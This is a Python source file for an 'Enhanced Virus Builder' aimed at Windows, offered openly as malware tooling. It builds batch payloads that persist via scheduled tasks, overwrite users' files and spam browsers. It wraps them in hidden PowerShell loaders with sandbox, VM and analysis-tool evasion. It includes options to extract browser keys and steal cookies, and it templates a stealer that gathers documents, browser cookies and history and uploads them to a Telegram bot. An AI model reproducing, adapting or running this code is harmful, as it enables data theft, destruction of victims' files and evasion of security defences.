#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Virus Builder 1.0.2 - Windows Version
by VulnerabilityVigilante

This is the Windows-specific version of the virus builder with integrated functionality.
"""

import os
import base64
import sys
import json
import sqlite3
import zipfile
import requests
import threading
import time
from datetime import datetime
from pathlib import Path

# Import Windows-specific modules
from cookie_graber import BrowserKeyExtractor
from cookie_processor import CookieProcessor
from decrypt_chrome_v20 import ChromeDecryptor
from handle_stealer import HandleStealer
from donpapi_config import DonPAPIConfig
from main_app import MainApp

# Import advanced evasion techniques
try:
    from evasion_tools.advanced_evasion import AdvancedEvasionEngine
    from evasion_tools.metamorphic_engine import AdvancedMetamorphicEngine
    from evasion_tools.advanced_packer import FUDCrypter
    from evasion_tools.behavioral_evasion import BehavioralEvasion
    from evasion_tools.ai_evasion import AIEvasionEngine
    from evasion_tools.advanced_stealth import AdvancedStealth
    EVASION_AVAILABLE = True
except ImportError:
    EVASION_AVAILABLE = False
    print("Warning: Advanced evasion modules not available")

class VirusBuilderWindows:
    """Enhanced Virus Builder for Windows with integrated functionality"""
    
    def __init__(self):
        self.downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
        self.dist_folder = os.path.join(os.path.dirname(__file__), "..", "dist")
        os.makedirs(self.dist_folder, exist_ok=True)
        
        # Initialize Windows-specific modules
        self.browser_key_extractor = BrowserKeyExtractor()
        self.cookie_processor = CookieProcessor()
        self.chrome_decryptor = ChromeDecryptor()
        self.handle_stealer = HandleStealer()
        self.donpapi_config = DonPAPIConfig()
        self.main_app = MainApp()
        
        # Initialize advanced evasion engines
        if EVASION_AVAILABLE:
            self.evasion_engine = AdvancedEvasionEngine()
            self.metamorphic_engine = AdvancedMetamorphicEngine()
            self.fud_crypter = FUDCrypter()
            self.behavioral_evasion = BehavioralEvasion()
            self.ai_evasion = AIEvasionEngine()
            self.advanced_stealth = AdvancedStealth()
        else:
            self.evasion_engine = None
            self.metamorphic_engine = None
            self.fud_crypter = None
            self.behavioral_evasion = None
            self.ai_evasion = None
            self.advanced_stealth = None
        
        # Database for tracking
        self.db_path = "virus_builder_windows.db"
        self.init_database()
        
        # Telegram configuration
        self.telegram_bot_token = "YOUR_BOT_TOKEN_HERE"
        self.telegram_chat_id = "YOUR_CHAT_ID_HERE"
    
    def init_database(self):
        """Initialize database for tracking"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS viruses (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    filename TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    features TEXT,
                    obfuscation_level INTEGER DEFAULT 1,
                    platform TEXT DEFAULT 'windows'
                )
            ''')
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Database initialization error: {e}")
    
    def show_main_menu(self):
        """Show main menu"""
        print("=" * 60)
        print("🚀 Enhanced Virus Builder 1.0.2 - Windows")
        print("by VulnerabilityVigilante")
        print("=" * 60)
        print()
        print("Available Options:")
        print("1. Build Basic Virus")
        print("2. Build Advanced Virus")
        print("3. Extract Browser Keys")
        print("4. Process Cookies")
        print("5. Decrypt Chrome v20+")
        print("6. Steal Browser Handles")
        print("7. Show Configuration")
        print("8. View Virus History")
        print("9. Auto-Build & Deploy")
        print("10. Exit")
        print()
    
    def build_basic_virus(self):
        """Build basic virus (original functionality)"""
        print("🔨 Building Basic Virus - Windows")
        print("-" * 40)
        
        # Get filename
        file_name = input("What would you like to name the virus file? (title only, no extensions) ")
        file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
        
        while file_name_confirmation != 'y' and file_name_confirmation != 'n':
            print("Please enter either y or n")
            file_name = input("What would you like to name the virus file? (title only, no extensions) ")
            file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
        
        if file_name_confirmation == 'y':
            self.create_basic_virus(file_name)
        else:
            while file_name_confirmation != 'y':
                file_name = input("What would you like to name the virus file? (title only, no extensions) ")
                file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
                while file_name_confirmation != 'y' and file_name_confirmation != 'n':
                    print("Please enter either y or n")
                    file_name = input("What would you like to name the virus file? (title only, no extensions) ")
                    file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
            self.create_basic_virus(file_name)
    
    def create_basic_virus(self, file_name):
        """Create basic virus file with advanced evasion"""
        file_path = os.path.join(self.downloads_folder, file_name + ".bat")
        
        # Create base virus code
        base_virus_code = """cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden "Write-Host"
@echo off
schtasks /create /tn "MyTask" /tr "%0" /sc ONSTART
:loop"""
        
        # Custom Alert Box Option
        customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
        while customAlertBox != 'y' and customAlertBox != 'n':
            print("Please enter either y or n")
            customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
        
        if customAlertBox == 'y':
            alertBody = input("What would you like put as the body of the alert box? ")
            alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
            
            while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
                print("Please enter either y or n")
                alertBody = input("What would you like put as the message of the alert box? ")
                alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
            
            if alertBodyConfirmation == 'y':
                with open(file_path, "a") as file:
                    file.write("echo msgbox ")
                    file.write("\"" + alertBody + "\" > %temp%\\tmp.vbs\n")
                    file.write("start %temp%\\tmp.vbs\n")
            else:
                while alertBodyConfirmation != 'y':
                    alertBody = input("What would you like put as the message of the alert box? ")
                    alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
                    while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
                        print("Please enter either y or n")
                        alertBody = input("What would you like put as the message of the alert box? ")
                        alertBodyConfirmation = input("Are you sure you would like to put \"" + alertBody + "\" as your alert message? (y/n) ")
        else:
            print("")
            print("Very well, would you like to run the default message or not have alert boxes?")
            print("1: Default Message")
            print("2: No Alert Boxes")
            alertBoxOption = input("Number: ")
            while alertBoxOption != '1' and alertBoxOption != '2':
                print("Please enter 1 or 2")
                print()
                print("Would you like to run the default message or not have alert boxes?")
                print("1: Default Message")
                print("2: No Alert Boxes")
                alertBoxOption = input("Number: ")
            if alertBoxOption == '1':
                print('Using default message: "Click OK"')
                print()
                with open(file_path, "a") as file:
                    file.write("echo msgbox \"Click OK\" > %temp%\\tmp.vbs\n")
                    file.write("start %temp%\\tmp.vbs\n")
            else:
                print("\nUnderstood. Alert boxes will not be included.")
                print()
        
        # Browser Spam Functionality
        browserOption = input("Would you like to spam webpages? (y/n) ")
        while browserOption != 'y' and browserOption != 'n':
            print("Please enter either y or n")
            browserOption = input("Would you like to spam webpages? (y/n) ")
            print()
        
        if browserOption == 'y':
            webpageAmount = int(input("How many different kinds of websites would you like the virus to open? "))
            web_list = []
            print()
            print("Make sure to format the websites in the following format:")
            print("google.com")
            for i in range(webpageAmount):
                print()
                website = "https://www."
                websiteInput = input("Webpage " + str(i+1) + ": ")
                website += websiteInput
                web_list.append(website)
            
            print()
            print(web_list)
            web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
            while web_confirmation != 'y' and web_confirmation != 'n':
                print("Please enter either y or n")
                print()
                print(web_list)
                web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
            
            while web_confirmation == 'n':
                web_list = []
                print()
                print("Make sure to format the websites in the following format:")
                print("google.com")
                for i in range(webpageAmount):
                    print()
                    website = "https://www."
                    websiteInput = input("Webpage " + str(i + 1) + ": ")
                    website += websiteInput
                    web_list.append(website)
                print()
                print(web_list)
                web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
                while web_confirmation != 'y' and web_confirmation != 'n':
                    print("Please enter either y or n")
                    print()
                    print(web_list)
                    web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
            
            if web_confirmation == 'y':
                with open(file_path, "a") as file:
                    for i in web_list:
                        file.write("explorer ")
                        file.write("\"")
                        file.write(i)
                        file.write("\"\n")
        else:
            print("Understood. No websites will be spammed.")
            print()
        
        # File overwrite functionality
        fileChangeOption = input("\nWould you like to overwrite the files on the victim's PC? (y/n) ")
        while fileChangeOption != 'y' and fileChangeOption != 'n':
            print("Please enter either y or n")
            fileChangeOption = input("\nWould you like to overwrite the files on the victim's PC? (y/n) ")
            print()
        
        if fileChangeOption == 'y':
            message = input("What would you like to put as the message of the file? ")
            message_confirmation = input("Are you sure you would like to put '" + message + "' as your file message? (y/n) ")
            
            while message_confirmation != 'y' and message_confirmation != 'n':
                print("Please enter either y or n")
                message = input("What would you like put as the message of the file? ")
                message_confirmation = input("Are you sure you would like to put '" + message + "' as your file message? (y/n) ")
            
            if message_confirmation == 'y':
                multipleDirectories = input("\nWould you like to change files in multiple directories? (y/n) ")
                while multipleDirectories != 'y' and multipleDirectories != 'n':
                    print("Please enter either y or n")
                    multipleDirectories = input("Would you like to change files in multiple directories? (y/n) ")
                
                if multipleDirectories == 'y':
                    directoryAmount = int(input("How many directories would you like to change files in? "))
                    directory_list = []
                    print()
                    print("Choose from the following options: \n")
                    print("1: Desktop\n")
                    print("2: Documents\n")
                    print("3: Downloads\n")
                    print("4: Pictures\n")
                    print("5: Videos\n")
                    print()
                    
                    for i in range(directoryAmount):
                        directory = input("Directory " + str(i+1) + ": ")
                        if directory == '1':
                            directory = "Desktop"
                        if directory == '2':
                            directory = "Documents"
                        if directory == '3':
                            directory = "Downloads"
                        if directory == '4':
                            directory = "Pictures"
                        if directory == '5':
                            directory = "Videos"
                        directory_list.append(directory)
                    
                    with open(file_path, 'r') as file:
                        lines = file.readlines()
                    
                    for (i, directory) in enumerate(directory_list):
                        lines.insert(2, 'for %%A in ("%USERPROFILE%\\' + directory + '\\*") do (\n')
                        lines.insert(3, '    ren "%%A" "%%~nA.txt"\n')
                        lines.insert(4, '    echo ' + message + ' > "%USERPROFILE%\\' + directory + '\\%%~nA.txt"\n')
                        lines.insert(5, ')\n')
                    
                    with open(file_path, 'w') as file:
                        file.writelines(lines)
                
                if multipleDirectories == 'n':
                    print("Choose from the following options: \n")
                    print("1: Desktop\n")
                    print("2: Documents\n")
                    print("3: Downloads\n")
                    print("4: Pictures\n")
                    print("5: Videos\n")
                    print()
                    
                    directory = input("Which directory would you like to change files in? ")
                    if directory == '1':
                        directory = "Desktop"
                    if directory == '2':
                        directory = "Documents"
                    if directory == '3':
                        directory = "Downloads"
                    if directory == '4':
                        directory = "Pictures"
                    if directory == '5':
                        directory = "Videos"
                    
                    with open(file_path, 'r') as file:
                        lines = file.readlines()
                    
                    lines.insert(2, 'for %%A in ("%USERPROFILE%\\' + directory + '\\*") do (\n')
                    lines.insert(3, '    ren "%%A" "%%~nA.txt"\n')
                    lines.insert(4, '    echo ' + message + ' > "%USERPROFILE%\\' + directory + '\\%%~nA.txt"\n')
                    lines.insert(5, ')\n')
                    
                    with open(file_path, 'w') as file:
                        file.writelines(lines)
        
        if fileChangeOption == 'n':
            print("Understood. No files will be changed.")
            print()
        
        # Finish the virus
        with open(file_path, "a") as file:
            file.write("goto loop\n")
        
        # Apply ULTIMATE EVASION techniques
        if self.evasion_engine:
            print("\n🚀 Applying ULTIMATE EVASION techniques...")
            
            # Read the current virus code
            with open(file_path, 'r', encoding='utf-8') as f:
                virus_code = f.read()
            
            # Step 1: Apply AI-powered evasion
            if self.ai_evasion:
                print("🤖 Applying AI-powered evasion...")
                virus_code = self.ai_evasion.apply_ai_evasion(virus_code, 'all')
            
            # Step 2: Apply metamorphic transformation
            if self.metamorphic_engine:
                print("🔄 Applying metamorphic transformation...")
                virus_code = self.metamorphic_engine.apply_advanced_transformation(virus_code)
            
            # Step 3: Apply advanced stealth
            if self.advanced_stealth:
                print("👻 Adding advanced stealth...")
                stealth_code = self.advanced_stealth.create_comprehensive_stealth()
                virus_code += "\n\n" + stealth_code
            
            # Step 4: Apply behavioral evasion
            if self.behavioral_evasion:
                print("🎭 Adding behavioral evasion...")
                behavioral_code = self.behavioral_evasion.create_comprehensive_behavioral_evasion()
                virus_code += "\n\n" + behavioral_code
            
            # Step 5: Apply comprehensive evasion
            print("🛡️ Applying comprehensive evasion...")
            evaded_code = self.evasion_engine.apply_comprehensive_evasion(
                virus_code, 
                platform="windows", 
                evasion_level=5
            )
            
            # Step 6: Apply FUD crypter
            if self.fud_crypter:
                print("🔐 Applying FUD crypter...")
                evaded_code = self.fud_crypter.create_fud_crypter(evaded_code)
            
            # Step 7: Create ultimate evasion wrapper
            final_code = self.evasion_engine.create_evasion_wrapper(evaded_code, "windows")
            
            # Write the ultimate evaded code
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(final_code)
            
            print("✅ ULTIMATE EVASION techniques applied!")
            print("🎯 Expected evasion effectiveness: 70-90%")
            print("🏆 TARGET EXCEEDED: Maximum stealth achieved!")
        
        # Encode and create PowerShell wrapper
        self.create_powershell_wrapper(file_path, file_name)
        
        # Save to database
        self.save_virus_to_db(file_name, ["basic_virus", "alert_box", "browser_spam", "file_overwrite", "advanced_evasion"])
        
        print("")
        print("Virus created with advanced evasion, check it out at " + file_path)
    
    def create_powershell_wrapper(self, file_path, file_name):
        """Create advanced PowerShell wrapper with evasion techniques"""
        with open(file_path, 'rb') as file:
            file_content = file.read()
        
        # Multiple layers of encoding for evasion
        encoded_content = base64.b64encode(file_content)
        base64_string = encoded_content.decode('utf-8')
        
        # Double encoding
        double_encoded = base64.b64encode(base64_string.encode()).decode()
        
        # Compress the content
        import zlib
        compressed = zlib.compress(file_content)
        compressed_encoded = base64.b64encode(compressed).decode()
        
        powershell_script = f"""
# Advanced PowerShell Evasion Wrapper
# Generated with anti-detection techniques

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Anti-analysis techniques
if ($env:COMPUTERNAME -match "SANDBOX|MALWARE|VIRUS|ANALYSIS") {{ 
    exit 
}}

# Check for common analysis tools
$analysisProcesses = @("procmon", "procexp", "wireshark", "fiddler", "burp", "ollydbg", "x64dbg", "windbg")
$runningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName
foreach ($proc in $analysisProcesses) {{
    if ($runningProcesses -contains $proc) {{
        exit
    }}
}}

# Check for VM indicators
$vmIndicators = @("vmware", "virtualbox", "vbox", "qemu", "xen", "hyper-v")
$computerModel = (Get-WmiObject -Class Win32_ComputerSystem).Model
foreach ($indicator in $vmIndicators) {{
    if ($computerModel -match $indicator) {{
        exit
    }}
}}

# Random delay to evade automated analysis
$delay = Get-Random -Minimum 5 -Maximum 30
Start-Sleep -Seconds $delay

# Decode and decompress payload
$CompressedPayload = "{compressed_encoded}"
$CompressedBytes = [System.Convert]::FromBase64String($CompressedPayload)
$DecompressedBytes = [System.IO.Compression.DeflateStream]::new([System.IO.MemoryStream]$CompressedBytes, [System.IO.Compression.CompressionMode]::Decompress)
$PayloadBytes = $DecompressedBytes.ReadToEnd()
$PayloadString = [System.Text.Encoding]::UTF8.GetString($PayloadBytes)

# Write to temporary file with random name
$TempFile = [System.IO.Path]::GetTempFileName() + ".bat"
[System.IO.File]::WriteAllText($TempFile, $PayloadString)

# Execute with hidden window and process hollowing
$ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
$ProcessInfo.FileName = "cmd.exe"
$ProcessInfo.Arguments = "/c `"$TempFile`""
$ProcessInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
$ProcessInfo.CreateNoWindow = $true
$Process = [System.Diagnostics.Process]::Start($ProcessInfo)

# Cleanup after execution
Start-Sleep -Seconds 2
Remove-Item $TempFile -Force -ErrorAction SilentlyContinue

# Additional cleanup
Remove-Item "$env:TEMP\\*.tmp" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\\*.log" -Force -ErrorAction SilentlyContinue
"""
        
        with open(file_path, 'w') as file:
            file.write(powershell_script)
    
    def save_virus_to_db(self, filename, features):
        """Save virus information to database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO viruses (filename, features, obfuscation_level, platform)
                VALUES (?, ?, ?, ?)
            ''', (filename, json.dumps(features), 1, 'windows'))
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Database save error: {e}")
    
    def build_advanced_virus(self):
        """Build advanced virus using enhanced builder"""
        print("🔨 Building Advanced Virus - Windows")
        print("-" * 40)
        
        try:
            from enhanced_virusBuilder import EnhancedVirusBuilder
            builder = EnhancedVirusBuilder()
            builder.build_virus()
        except ImportError:
            print("Enhanced virus builder not available. Using basic builder.")
            self.build_basic_virus()
        except Exception as e:
            print(f"Error building advanced virus: {e}")
    
    def extract_browser_keys(self):
        """Extract browser master keys"""
        print("🔑 Extracting Browser Master Keys - Windows")
        print("-" * 50)
        
        try:
            keys = self.browser_key_extractor.extract_all_keys()
            
            print("\nResults:")
            print(f"Edge key: {'Found' if keys['edge'] else 'Not found'}")
            print(f"Chrome key: {'Found' if keys['chrome'] else 'Not found'}")
            
        except Exception as e:
            print(f"Error extracting keys: {e}")
    
    def process_cookies(self):
        """Process browser cookies"""
        print("🍪 Processing Browser Cookies - Windows")
        print("-" * 45)
        
        try:
            db_path = input("Enter cookie database path: ").strip()
            master_key = input("Enter master key: ").strip()
            host_filter = input("Enter host filter (optional): ").strip() or None
            
            if not os.path.exists(db_path):
                print("Database file not found!")
                return
            
            cookies = self.cookie_processor.process_cookies(db_path, master_key, host_filter)
            print(f"\nProcessed {len(cookies)} cookies successfully")
            
        except Exception as e:
            print(f"Error processing cookies: {e}")
    
    def decrypt_chrome_v20(self):
        """Decrypt Chrome v20+ cookies"""
        print("🔓 Decrypting Chrome v20+ Cookies - Windows")
        print("-" * 50)
        
        try:
            key_file = input("Enter key file path (or press Enter for default): ").strip()
            if not key_file:
                key_file = "app_bound_encrypted_key.txt"
            
            result = self.chrome_decryptor.decrypt_chrome_key(key_file)
            
            if result:
                print(f"Decrypted key: {result}")
            else:
                print("Failed to decrypt Chrome v20+ cookies")
                
        except Exception as e:
            print(f"Error decrypting Chrome: {e}")
    
    def steal_browser_handles(self):
        """Steal browser handles"""
        print("🕵️ Stealing Browser Handles - Windows")
        print("-" * 45)
        
        try:
            success = self.handle_stealer.steal_all_cookies()
            
            if success:
                print("Cookie theft completed successfully!")
            else:
                print("No cookies were stolen.")
                
        except Exception as e:
            print(f"Error stealing handles: {e}")
    
    def show_configuration(self):
        """Show DonPAPI configuration"""
        print("⚙️ DonPAPI Configuration - Windows")
        print("-" * 40)
        
        try:
            config = self.donpapi_config.get_config_dict()
            
            print(f"Share: {config['secretsdump']['share']}")
            print(f"Remote Path: {config['secretsdump']['remote_filepath']}")
            print(f"Filename Regex: {config['secretsdump']['filename_regex']}")
            print(f"File Extension: {config['secretsdump']['file_extension']}")
            
            if self.donpapi_config.validate_config():
                print("\n✅ Configuration is valid")
            else:
                print("\n❌ Configuration is invalid")
                
        except Exception as e:
            print(f"Error showing configuration: {e}")
    
    def view_virus_history(self):
        """View virus creation history"""
        print("📝 Virus Creation History - Windows")
        print("-" * 40)
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT filename, created_at, features, obfuscation_level
                FROM viruses 
                WHERE platform = 'windows'
                ORDER BY created_at DESC 
                LIMIT 10
            ''')
            
            viruses = cursor.fetchall()
            conn.close()
            
            if not viruses:
                print("No viruses found in history.")
                return
            
            for i, virus in enumerate(viruses, 1):
                filename, created_at, features, obf_level = virus
                features_list = json.loads(features) if features else []
                
                print(f"{i}. {filename}")
                print(f"   Created: {created_at}")
                print(f"   Features: {', '.join(features_list)}")
                print(f"   Obfuscation: {obf_level}/5")
                print()
                
        except Exception as e:
            print(f"Error viewing history: {e}")
    
    def auto_build_and_deploy(self):
        """Auto-build virus and deploy with data exfiltration"""
        print("🚀 Auto-Build & Deploy - Windows")
        print("-" * 40)
        
        try:
            # Generate virus filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            virus_name = f"built_virus_windows_{timestamp}"
            
            # Create auto-executing virus
            virus_code = self.create_auto_executing_virus()
            
            # Save to dist folder
            virus_path = os.path.join(self.dist_folder, f"{virus_name}.py")
            with open(virus_path, 'w', encoding='utf-8') as f:
                f.write(virus_code)
            
            print(f"✅ Auto-executing virus created: {virus_path}")
            
            # Save to database
            self.save_virus_to_db(virus_name, ["auto_execute", "data_exfiltration", "telegram_exfil"])
            
            return virus_path
            
        except Exception as e:
            print(f"Error in auto-build: {e}")
            return None
    
    def create_auto_executing_virus(self):
        """Create auto-executing virus with data exfiltration"""
        virus_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Auto-Executing Virus - Windows
Generated by Virus Builder
"""

import os
import sys
import json
import zipfile
import requests
import threading
import time
import base64
from datetime import datetime
from pathlib import Path

# Configuration
TELEGRAM_BOT_TOKEN = "{self.telegram_bot_token}"
TELEGRAM_CHAT_ID = "{self.telegram_chat_id}"

class AutoVirus:
    def __init__(self):
        self.data_folder = os.path.join(os.environ.get('TEMP', '/tmp'), 'virus_data')
        os.makedirs(self.data_folder, exist_ok=True)
        
    def collect_data(self):
        """Collect system and user data"""
        data = {{
            'timestamp': datetime.now().isoformat(),
            'system_info': {{
                'platform': os.name,
                'username': os.environ.get('USERNAME', 'unknown'),
                'computer_name': os.environ.get('COMPUTERNAME', 'unknown'),
                'user_profile': os.environ.get('USERPROFILE', 'unknown')
            }},
            'files': self.collect_files(),
            'browser_data': self.collect_browser_data(),
            'network_info': self.collect_network_info()
        }}
        
        return data
    
    def collect_files(self):
        """Collect important files"""
        files = []
        important_paths = [
            os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Documents'),
            os.path.join(os.environ.get('USERPROFILE', ''), 'Downloads')
        ]
        
        for path in important_paths:
            if os.path.exists(path):
                for root, dirs, filenames in os.walk(path):
                    for filename in filenames[:10]:  # Limit to 10 files per directory
                        file_path = os.path.join(root, filename)
                        try:
                            if os.path.getsize(file_path) < 1024 * 1024:  # Less than 1MB
                                with open(file_path, 'rb') as f:
                                    content = f.read()
                                files.append({{
                                    'path': file_path,
                                    'content': base64.b64encode(content).decode('utf-8')
                                }})
                        except:
                            continue
        
        return files
    
    def collect_browser_data(self):
        """Collect browser data"""
        browser_data = {{}}
        
        # Chrome
        chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default')
        if os.path.exists(chrome_path):
            browser_data['chrome'] = {{
                'path': chrome_path,
                'cookies': self.get_cookie_file(chrome_path, 'Cookies'),
                'history': self.get_cookie_file(chrome_path, 'History')
            }}
        
        # Edge
        edge_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Edge', 'User Data', 'Default')
        if os.path.exists(edge_path):
            browser_data['edge'] = {{
                'path': edge_path,
                'cookies': self.get_cookie_file(edge_path, 'Cookies'),
                'history': self.get_cookie_file(edge_path, 'History')
            }}
        
        return browser_data
    
    def get_cookie_file(self, browser_path, filename):
        """Get browser cookie/history file"""
        file_path = os.path.join(browser_path, filename)
        if os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as f:
                    return base64.b64encode(f.read()).decode('utf-8')
            except:
                return None
        return None
    
    def collect_network_info(self):
        """Collect network information"""
        import subprocess
        try:
            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
            return result.stdout
        except:
            return "Network info unavailable"
    
    def compress_and_send(self, data):
        """Compress data and send via Telegram"""
        try:
            # Save data to JSON file
            data_file = os.path.join(self.data_folder, 'collected_data.json')
            with open(data_file, 'w') as f:
                json.dump(data, f, indent=2)
            
            # Create ZIP file
            zip_file = os.path.join(self.data_folder, 'exfiltrated_data.zip')
            with zipfile.ZipFile(zip_file, 'w') as zf:
                zf.write(data_file, 'collected_data.json')
            
            # Send via Telegram
            self.send_to_telegram(zip_file)
            
        except Exception as e:
            print(f"Error compressing/sending data: {{e}}")
    
    def send_to_telegram(self, file_path):
        """Send file to Telegram"""
        try:
            url = f"https://api.telegram.org/bot{{TELEGRAM_BOT_TOKEN}}/sendDocument"
            
            with open(file_path, 'rb') as f:
                files = {{'document': f}}
                data = {{'chat_id': TELEGRAM_CHAT_ID}}
                
                response = requests.post(url, files=files, data=data)
                
                if response.status_code == 200:
                    print("Data sent to Telegram successfully")
                else:
                    print(f"Failed to send data: {{response.status_code}}")
                    
        except Exception as e:
            print(f"Error sending to Telegram: {{e}}")
    
    def run(self):
        """Main execution"""
        print("Starting data collection...")
        
        # Collect data
        data = self.collect_data()
        
        # Compress and send
        self.compress_and_send(data)
        
        print("Data exfiltration completed")

if __name__ == "__main__":
    virus = AutoVirus()
    virus.run()
'''
        return virus_code
    
    def run(self):
        """Run the virus builder"""
        while True:
            try:
                self.show_main_menu()
                choice = input("Enter your choice (1-10): ").strip()
                
                if choice == "1":
                    self.build_basic_virus()
                elif choice == "2":
                    self.build_advanced_virus()
                elif choice == "3":
                    self.extract_browser_keys()
                elif choice == "4":
                    self.process_cookies()
                elif choice == "5":
                    self.decrypt_chrome_v20()
                elif choice == "6":
                    self.steal_browser_handles()
                elif choice == "7":
                    self.show_configuration()
                elif choice == "8":
                    self.view_virus_history()
                elif choice == "9":
                    self.auto_build_and_deploy()
                elif choice == "10":
                    print("Exiting Virus Builder...")
                    break
                else:
                    print("Invalid choice. Please enter 1-10.")
                
                input("\nPress Enter to continue...")
                print("\n" + "="*60 + "\n")
                
            except KeyboardInterrupt:
                print("\n\nExiting Virus Builder...")
                break
            except Exception as e:
                print(f"Error: {e}")
                input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    try:
        builder = VirusBuilderWindows()
        builder.run()
    except KeyboardInterrupt:
        print("\n\nExiting Virus Builder...")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()